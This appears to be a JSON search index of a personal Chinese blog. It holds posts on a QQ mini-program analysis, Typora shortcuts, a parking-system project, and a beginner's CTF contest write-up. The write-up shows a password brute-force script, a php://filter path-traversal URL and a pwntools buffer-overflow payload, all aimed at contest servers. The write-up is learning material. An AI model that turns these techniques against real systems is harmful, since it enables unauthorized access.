{"meta":{"title":"MiaoTony's小窝","subtitle":"喵喵喵~","description":"喵~欢迎各位大佬的来访呀！","author":"MiaoTony","url":"https://miaotony.github.io","root":"/"},"pages":[{"title":"about","text":"","path":"about/index.html"},{"title":"contact","text":"","path":"contact/index.html"},{"title":"categories","text":"","path":"categories/index.html"},{"title":"tags","text":"","path":"tags/index.html"},{"title":"friends","text":"","path":"friends/index.html"}],"posts":[{"title":"小想法 | QQ小程序【年终报告单/2019年终总结】分析","text":"缘由这两天看空间各种发【我的2019年终报告】，然后我也去测了一下，没想到啥也不用填，申请获取个人信息的权限，报告就出来了。 然而弹出一个遮罩层让你先看个15s的广告…… 超想吐槽，包括页面下面的广告。。 然后看完广告，终于出来了。 正当我截了图返回之后，噫换个性别试试。 好，这回不一样了呀！ 然后再来一次，噫，又不一样了……这让我怀疑他就是假的几张图片而已吧。 我兴趣来了，不如来折腾一下，分析一下这个小程序吧。 （不折腾会死…… 开始折腾 1先来看一看这个小程序的设置，发现只获取了用户信息。看一眼更多资料—— 先确定了这是个个人开发的小程序，看相关的域名除了Tencent家的，主要就是wxa.game-a1.cn 和free-api.heweather.com。 查了一下，后者是一个查天气的API（需要的话可以用一波）（就是很迷惑为啥这里会有这个 前者是一个个人的域名吧，看样子是用的一个开发小程序的平台。根域名还是个博客，里面还有搭建微信小程序的经历。 2ping了一下这个域名，得到IP：47.105.42.112 然后抓了个包，过滤只看关于这个IP的数据包。发现有两个。 前面一个不懂什么鬼填了个表，估计收集了一波使用数据，先不管。重点是后面这个。 很明显是访问了http://wxa.game-a1.cn/wxa/qqnz2019/index.php这个网址。 3浏览器启动，F12大法好呀。 好一个JSON字符串，来分析一下吧。 qrcode很明显是二维码啦，下载下来解码发现调用了qq小程序的接口吧，访问会跳转到这个小程序。 url和url1都是一样的，指向了一个阿里云的对象存储。↓ https://oos-pic.oss-cn-beijing.aliyuncs.com/2019%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/1.png 多次刷新发现好像的确就那几张图片，改变了一下x.png而已。 而且的确这就是假的图啦。（不然哪来的用户数据可以分析 4既然都知道是几张图片而已了，那顺便就爬下来吧。 PyCharm 启动，来写一写jio本。 写range是因为随便试了一下，本来就没有几张图片而已，然而懒得手动下载。 看结果的确就7张图片。。 呐就这几张了↓ 5看样子小程序获取个人头像，然后再和二维码、上面的任意一张图拼接在一起而已吧。 就是这个form.php，看样子是用来统计使用数据的吧emmm问题不大。 小结哇呜折腾了一个中午好气啊，（有毒 不折腾会死 不管怎么说这个小程序还是有点意思的，至少做的那几张图片还挺不错的哈哈哈。 不过要吐槽这个广告超级讨厌emmm 就这样吧。 爬取图片的源码 和 爬到的图片放到了Github上了，有需要的可以去看看吧。 URL：这是网址 https://github.com/miaotony/Scrapy_2019Year-end_Report","path":"2019/12/04/Scrapy_2019Year-end_Report/"},{"title":"CTF | Asuri战队 2019招新赛 WriteUP","text":"Asuri 招新赛WriteUP 20191117网址： http://139.9.212.218:8000/challenges 官方安排及WriteUP：https://github.com/Kit4y/2019-Asuri-Recruitment-Src-and-wp testflag{this_is_test_flag} misc-签到 base64解码即得到 flag{1_want_jiamus_p0wer} baby-web-九曲十八弯 http://desperadoccy.club:39011/ base64解码 Asuri{view_source&#39;s_power} 快速计算 http://47.102.107.100:39012/ 连续20次在1-2s内判断是否正确，即可得到flag。 import requests import re import time s = requests.Session() r = s.get(\"http://47.102.107.100:39012/\") for i in range(20): time.sleep(1) equation = re.findall(r'&lt;div>(.*)=(.*)&lt;/div>', r.text)[0] print(equation) answer = eval(equation[0]) if answer == eval(equation[1]): values = {'answer': 'true'} else: values = {'answer': 'false'} r = s.post(\"http://47.102.107.100:39012/\", data=values) r.encoding = 'utf-8' print(r.text) Asuri{python_1s_th3_be3t_l4ngu4ge} medium_web_justburp http://139.9.212.218:39010/ 查找网站目录下的文件 访问robots.txt 得到： 访问hint.php 得到一个文件 尝试以admin作为用户名，用以上信息作为密码写脚本进行登录， 然而好像没有成功（有可能有成功的没看到？？？ 难受了，现场写的时候脑乱了，把所有登录数据都打印出来了，然后没找到flag…加一个if重新来就看到了惹emmm 爆破一波 # -*- coding:utf-8 -*- import requests s = requests.Session() r = s.get(\"http://139.9.212.218:39010/index.php\") r.encoding = \"utf-8\" print(r.text) with open('name-pass.txt', 'r') as file: contents = file.read().split() # print(contents) passwords = contents for password in passwords: values = {'name': 'admin', 'password': password} r = s.get(\"http://139.9.212.218:39010/index.php\", params=values) r.encoding = 'utf-8' if '密码错误' not in r.text: print(r.text) 即可得到 &lt;!DOCTYPE html> &lt;html>&lt;head>&lt;meta charset=\"utf-8\" /> &lt;title>Hi hacker&lt;/title> &lt;/head> &lt;body bgcolor=\"bisque\"> &lt;form action=\"index.php\" method=\"get\">用户名：&lt;br>&lt;input type=\"text\" name=\"name\">&lt;br>密码：&lt;br>&lt;input type=\"text\" name=\"password\">&lt;br>&lt;br>&lt;input type=\"submit\" value=\"登陆\"> &lt;/form> &lt;p>hint:admin用户的密码似乎在某个页面里 &lt;/p> &lt;p> 看你骨骼精奇，就将flag交于你了！Asuri{Burp_1s_Gre@t}&lt;/p> &lt;/body> &lt;/html> flag: Asuri{Burp_1s_Gre@t} 其实这题用BurpSuite更快，导入字典直接爆破都不用自己写jio本。。然而我现场还在搜它怎么用…… hard_web_php是世界上最好的语言 http://139.9.212.218:39009/ 改cookie重发 访问read_file.php，得到 访问no_flag_here.php ，构造参数进入根目录 然而！emmm这个scandir怎么获取这个flag文件内容啊！！！ 看了大师傅的WriteUP，发现PHP还可以这么读取文件…（下面 构造file=php://filter/read=convert.base64-encode/resource=+绝对路径 http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=../../../flag04ad59.php 或者 http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=/flag04ad59.php 得到一串Base64字符串 PD9waHANCiAgICAvL0FzdXJpe1dFQl9XSU5ORVJ9DQo/Pg== 解码后： flag: Asuri{WEB_WINNER} easy_pwn from pwn import * # 引入pwntools库 import time sh = remote('49.235.243.206', 9001) # 创建与靶场服务器的连接 offset = 0x60+0x8 # 偏移 system_addr = 0x400766 # system函数地址 for i in range(4, 20): sh.recvuntil('Please input your passworld size') sh.sendline(p64(i)) # 向程序发送数据 sh.recvuntil('Please input your password') payload = offset * b'a' + p64(system_addr) # 构造攻击数据 sh.sendline(payload) # 向程序发送数据 sh.interactive() # 将控制流从程序转移到自己这里 完了不会写，嘤嘤嘤 medium_rev#!/usr/bin/env python # encoding: utf-8 # 如果觉得不错，可以推荐给你的朋友！http://tool.lu/pyc def encrypt_for_each(): index = [ 0] * 100 for i in range(100): tmp = i ^ 77 yield tmp None def encrypt(msg, key): iters = encrypt_for_each() enc = [] for (m, k) in zip(msg, key): e = m ^ k ^ iters.__next__() enc.append(e) return enc def generate_key(): def check_prime(num): if num &lt; 2: return False for i in range(2, num): if num % i == 0: return False return True test = [ 8, 61, 85, 25, 121, 53, 26, 0, 81, 52, 124, 22, 137, 56, 94, 107, 59, 132, 90, 3, 51, 46, 77, 127, 35, 86, 134, 20, 73, 32, 66, 99, 7, 69, 122, 4, 142, 23, 80, 109, 60, 79, 36, 62, 5, 104, 102, 14, 58, 149, 31, 96, 68, 114, 116, 11, 95, 87, 146, 123, 15, 135, 33, 37, 110, 19, 106, 30, 130, 101, 97, 98, 141, 2, 47, 6, 24, 131, 16, 111, 150, 55, 1, 76, 12, 138, 64, 120, 118, 29, 145, 147, 9, 113, 103, 40, 92, 71, 72, 129, 139, 100, 63, 133, 42, 125, 74, 88, 143, 144, 38, 140, 67, 119, 136, 115, 54, 21, 50, 108, 128, 57, 112, 43, 84, 70, 78, 28, 41, 93, 44, 13, 18, 10, 48, 27, 83, 65, 17, 75, 126, 39, 49, 91, 34, 82, 45, 148, 105, 89, 117] key = (lambda .0: continue[ i for i in .0 ])(filter(check_prime, test)) return key if __name__ == '__main__': key = generate_key() msg = [ 22, 21, 167, 66, 9, 27, 3, 119, 42, 99, 68, 86, 13, 166, 3, 120, 22, 59, 9, 77, 40, 3, 233, 41, 67, 108, 80, 179, 86, 36, 31, 107, 77, 4, 75] print('encryt message is {}'.format(msg)) lambda .0: continue[ i for i in .0 ] 这个.0执行不了啊emmm 我换成x也报错唉！ middle_pwn 小结 第一次打CTF呢，虽然只拿了个第六，还拿了个娃娃233 除了石榴园的真的没多少打这个比赛的呀。 我好菜啊，这次一题pwn都没写出来，好难过嘤嘤嘤 现场查BurpSuite怎么用也是绝了（那节培训我没去emmm 总之CTF还是挺好玩的哈哈哈哈，有空还是要好好学一波呢！ 等我有空再折腾一下，搭个博客吧 咕咕咕 20191128 更新：我来折腾了，嘻嘻嘻！","path":"2019/11/28/CTF_2019Asuri_Recruitment/"},{"title":"test","text":"测试一下再来一下哈~ 喵~~嘿嘿嘿","path":"2019/11/28/test/"},{"title":"typora_tips 一些关于typora的快捷键","text":"[TOC] ​ 随便练练typora，参考了一些网上的资料，顺便记录一下，方便后面查阅哈~ 标题ctrl + 数字键 最多支持到六级标题 一级标题 二级标题 三级标题 四级标题 五级标题 六级标题 取消标题​ ctrl + 数字0 标题取消标题 加粗ctrl + B 这是加粗 倾斜ctrl + I 这是倾斜 下划线ctrl + U 这是下划线 删除线alt + shift + 5 这是删除线 无序列表 - + space + enter miao miaomiao! 嵌套 再来嵌套 上一个层次 喵！ 有序列表数字键. + space + enter 第一个 第二个 嵌套一下 再来一下 再嵌套一个 继续 继续来 就这样吧 任务列表- [] TODO - [x]已完成 这是待完成的 这个已完成了 引用&gt; + space + enter 或者 ctrl + shift + Q 这就是引用 这也是 ​ 还可以嵌套引用 ​ 再来一个 这也行 一样的 插入图片ctrl + shift + I 网上说用MPic做图床挺不错的。（还没试过 直接拖进来也行 插入链接ctrl + K 这是链接，跳转到我的博客哈 插入表格ctrl + T mm text 测试 再测试 123 456 插入代码单行代码（文中的代码）ctrl + shift + ` `输入代码` 多行代码（代码块）ctrl + shift + K ``` 输入代码 ``` print(\"Hello world!\\n\") # Python printf(\"Hello, this is C.\") // C disp(\"Hello, this is MATLAB.\") % MATLAB print(\"Hello, this is lua.\") -- lua 插入表情:名称: (英文状态下) :cat::dog: PS：微软输入法可以用ctrl + shift + B弹出表情窗口。 😀👌 插入分割线--- 下面是分割线 插入高亮显示==中间写文字== ==这是高亮== 插入脚注文字[^脚注] 示例^1 插入公式ctrl + shift + M 或者 行内公式（内联公式）： $公式$ 行间公式： $$ 公式 $$ $$\\lim_{x\\to +\\infty} \\frac{1}{x}=0$$加个框试试（\\boxed{}）：$$\\boxed{ \\overrightarrow{AB}}$$ 这是行内公式 $ \\sqrt[3]{test} $ ，妙啊~ 具体的还得慢慢看呢。 顺便学一波LaTex也挺不错的~ 插入目录[toc] + ENTER 就是最上面那个啦~ 新建文件ctrl + N 选中中文/英文ctrl + D miao miao~ ctrl + Shift + 左/右 快速选中整个词语/单词。 选中整行ctrl + L 查找ctrl + F 替换ctrl + H 跳转到开头/结尾ctrl + HOME 跳转至文章开头 ctrl + END 跳转至文章末尾 打开文件（笔记）ctrl + P 全屏显示F11 侧边栏ctrl + shift + L 清除格式ctrl + \\ 切换到代码模式ctrl + / ==etc.== 还有挺多还要慢慢去发掘呢~ 顺便说一下 Snipaste 这个截图工具挺强大的 官网 https://zh.snipaste.com/ 本文搬运自我的csdn博客啦~","path":"2019/08/29/typora_tips/"},{"title":"小想法 | 开源一个自己的Python小项目「Park at ease」停车场管理系统","text":"Park at ease停车场管理系统基于Python实现 Park Management SystemBased on Python… print('Hello, this is Park_at_ease!') 一些说明这个项目本来是给部门里小干事布置的《2019寒假进阶指南》里 Section2 的课设任务（题目基本上是根据自己的想法出的），当时自己正好在学Python，就想拿这个项目练练手，于是就有了这个基于Python面向对象实现的停车场管理系统。 原来这个项目都是自己弄着玩的，这几天整理文件发现几个月前还写了这玩意儿，还挺有意思的。这个项目其实还有很多可以开发的空间的，于是就想着把它开源了吧，希望大家可以一起来完善呢！ PS:原则上不提供技术支持哈。 项目网站（基于Github Pages搭建）：来点我哈 或 https://miaotony.github.io/Park_at_ease/ GitHub项目网址：来点我鸭 或 https://github.com/miaotony/Park_at_ease 欢迎大家在此基础上继续完善鸭~欢迎Star、Fork、提PR &amp; issue！ 使用及转载时请注明出处，保留作者信息，严禁商用，严禁用于完成课设任务，谢谢！ Overview 这是编者参考了一小部分网络上相关的题目，结合实际生活，融合了自己一些想到的，给小干事们出的题目。这里直接就截屏放出来吧，PDF还有别的内容懒得改了。如果有什么建议欢迎在GitHub上提issue或者在这里评论哈~！ TODO 管理员界面 Administrator Interface 文件操作 FileIO 登录界面 Login 登录加密 Login Encryption 图形界面 GUI 多线程或多进程 Multithreading or Multiprocessing 邮件推送 Email Push 微信推送 WeChat Push TCP 嵌入式开发 Embedded Development etc. 具体请移步到GitHub鸭！ 项目网站（基于Github Pages搭建）：来点我哈 或 https://miaotony.github.io/Park_at_ease/ GitHub项目网址：来点我鸭 或 https://github.com/miaotony/Park_at_ease 溜了溜了下次再见啦~ 搬运自我的csdn博客啦~","path":"2019/08/18/Park_at_ease/"}]}